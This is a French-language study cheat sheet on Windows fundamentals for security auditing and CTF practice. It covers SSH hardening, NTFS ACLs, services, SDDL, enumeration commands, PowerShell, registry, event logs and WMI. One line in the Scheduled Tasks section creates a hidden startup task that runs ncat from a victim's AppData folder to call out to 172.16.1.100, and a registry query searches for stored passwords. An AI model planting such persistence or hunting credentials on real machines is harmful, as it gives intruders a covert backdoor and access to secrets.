# Windows Fondamental

## Setup & Organisation

### Structurer son audit

Gestion des mots de passe : 1Password, LastPass, Keeper, Bitwarden

### Prise de notes

Informations à capturer :
- Information nouvelle
- Idées pour tests ultérieurs
- Résultats d'analyse
- Enregistrements
- Captures d'écran

Outils : Notion.so, Obsidian, Xmind
Documentation : GhostWriter, Pwndoc
Captures d'écran : Flameshot
Création de GIFs : Peek

### Virtualisation

Types : matérielle, applications, stockage, données, réseau

Avantages :
1. Isolation des services entre VMs
2. Indépendance du système invité vis-à-vis de l'hôte
3. Migration/clonage par simple copie
4. Allocation dynamique des ressources via l'hyperviseur
5. Meilleure utilisation des ressources matérielles
6. Provisionnement rapide
7. Gestion simplifiée
8. Haute disponibilité grâce à l'indépendance physique

### Préparer ses VMs (Linux & Windows)

Deux snapshots avec les outils pré-installés.

Outils pour anciennes versions Windows : Chocolatey, MediaCreationTool.bat, Rufus

### Configuration VPS

```
# sshd_config
LogLevel VERBOSE
PermitRootLogin no
MaxAuthTries 3
MaxSessions 5
HostbasedAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication yes
UsePAM yes
X11Forwarding no
PrintMotd no
ClientAliveInterval 600
ClientAliveCountMax 0
AllowUsers <username>
Protocol 2
AuthenticationMethods publickey,keyboard-interactive
PasswordAuthentication no
```

2FA SSH : [Guide Debian](https://www.linuxbabe.com/debian/ssh-two-factor-authentication-debian)

## Windows OS

```powershell
Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
```

### Accès distant

VPN, SSH, FTP, VNC, WinRM, RDP

```bash
xfreerdp /v:$IP /u:$USER /p:$PASSWORD /dynamic-resolution
```

## Système de fichiers

### FAT32

- Compatible multi-plateformes et multi-appareils
- Limitation : fichiers < 4 Go, pas de protection intégrée

### NTFS

- Journalisation, permissions granulaires, grandes partitions
- Peu supporté nativement sur mobile/anciens appareils

### ACL (icacls)

```cmd
icacls c:\windows
icacls c:\Users
```

Héritage : (CI) conteneur, (OI) objet, (IO) héritage seul, (NP) pas de propagation, (I) hérité

Permissions : F (full), D (delete), N (none), M (modify), RX (read/execute), R (read), W (write)

```cmd
icacls c:\users /grant joe:f
icacls c:\users /remove joe
```

## Services & Processus

Le Service Control Manager (SCM) gère les services Windows.
`lsass.exe` : processus de sécurité (applique la stratégie de sécurité).

### Comptes de service

- LocalSystem (plus haut niveau d'accès)
- LocalService
- NetworkService

### SDDL (Security Descriptor Definition Language)

```
D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)
```

- D: = autorisations DACL
- AU = Utilisateurs authentifiés
- A;; = accès autorisé
- CC = SERVICE_QUERY_CONFIG
- LC = SERVICE_QUERY_STATUS
- RP = SERVICE_START
- RC = READ_CONTROL

```powershell
Get-ACL -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List
```

### Sessions Windows

Types : Interactive, Non-interactive

Comptes système : SYSTEM (GOD), LocalService, NetworkService

## Windows CLI

### Commandes d'énumération

```cmd
hostname
systeminfo
whoami
whoami /priv
whoami /groups
ver
ipconfig /all
arp /a
net user
net localgroup
net share
net view
tasklist /svc
net start
wmic service list brief
```

### Scheduled Tasks

```cmd
SCHTASKS /Query /V /FO list
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
```

## PowerShell

### Commandes de base

```powershell
Get-Command
Get-Command -Verb Get
Get-Location
Get-Module
Find-Module -Name AdminToolbox
Install-Module -Name AdminToolbox -RequiredVersion 11.0.8
```

### Gestion utilisateurs & groupes

Types de comptes : Administrator, Default Account, Guest Account, WDAGUtility Account

```powershell
Get-LocalGroup
Get-LocalUser
New-LocalUser -Name "JLawrence" -NoPassword
$Password = Read-Host -AsSecureString
Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO EagleFang"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"
```

RSAT :
```powershell
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
Get-Module -Name ActiveDirectory -ListAvailable
```

### Cmdlets fichiers

| Commande | Alias | Description |
| --- | --- | --- |
| Get-Item | gi | Récupérer un objet |
| Get-ChildItem | ls/dir/gci | Lister le contenu |
| New-Item | md/mkdir/ni | Créer un objet |
| Set-Item | si | Modifier les propriétés |
| Copy-Item | copy/cp/ci | Dupliquer |
| Rename-Item | ren/rni | Renommer |
| Remove-Item | rm/del/rmdir | Supprimer |
| Get-Content | cat/type | Afficher le contenu |
| Add-Content | ac | Ajouter au fichier |
| Set-Content | sc | Écraser le contenu |
| Clear-Content | clc | Vider le contenu |
| Compare-Object | diff/compare | Comparer des objets |

```powershell
Get-ChildItem -Path C:\Users\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object {($_.Name -like "*.txt")}
```

### Services

```powershell
Get-Service | ft DisplayName,Status
Get-Service | Measure
Get-Service | Where-Object DisplayName -like '*Defender*' | ft DisplayName,ServiceName,Status
Get-Service -ComputerName $HOST
```

### Registre

```powershell
Get-ChildItem C:\Windows\System32\config\
Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property
Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

```cmd
REG QUERY HKCU /F "Password" /t REG_SZ /S /K
```

### Event Logs

```cmd
wevtutil el
wevtutil gl "Windows PowerShell"
wevtutil qe Security /c:5 /rd:true /f:text
wevtutil epl System C:\system_export.evtx
```

```powershell
Get-WinEvent -ListLog *
Get-WinEvent -ListLog Security
Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625'}     # Login Failure
Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | Select-Object -ExpandProperty Message  # Critical
```

### WMI

WMI est un sous-système de PowerShell.

Composants : WMI Service, Managed Objects, WMI Providers, Classes, Methods, WMI Repository, CIM Object Manager, WMI API, WMI Consumer

```powershell
wmic useraccount get name,sid
wmic group get name,sid
Get-WmiObject -Class Win32_UserAccount
Get-WmiObject -Class Win32_Group
```

### Réseau

| Cmdlet | Description |
| --- | --- |
| Get-NetIPInterface | Propriétés des adaptateurs réseau |
| Get-NetIPAddress | Configurations IP (≈ ipconfig) |
| Get-NetNeighbor | Cache voisins (≈ arp -a) |
| Get-NetRoute | Table de routage (≈ route) |
| Set-NetAdapter | Propriétés Layer-2 (VLAN, MAC) |
| Set-NetIPInterface | DHCP, MTU, etc. |
| New-NetIPAddress | Créer une adresse IP |
| Disable-NetAdapter | Désactiver une interface |
| Enable-NetAdapter | Activer une interface |
| Restart-NetAdapter | Redémarrer un adaptateur |
| Test-NetConnection | Diagnostic réseau (ping, tcp, traceroute) |

```powershell
# Activer SSH
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
```

### Web requests

```powershell
Invoke-WebRequest -Uri "https://example.com" -Method GET | fl images
```

### Extensions PowerShell

| Extension | Description |
| --- | --- |
| .ps1 | Scripts exécutables |
| .psm1 | Fichiers de module |
| .psd1 | Fichiers de données (clé/valeur) |

### Astuces CTF / Énumération

```cmd
dir /a:h /s /b | find /c /v ""
```

```cmd
for /r %i in (flag.txt) do @if %~zi gtr 0 echo %i
```

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "RegisteredOwner"
```

```powershell
Get-ADUser -Filter {(Surname -eq "Flag")} -Properties GivenName | Select-Object GivenName
tasklist | sort /r | findstr /i "vm"
Get-WinEvent -FilterHashTable @{LogName='Security';ID='x'} | Select-Object -ExpandProperty Message
```
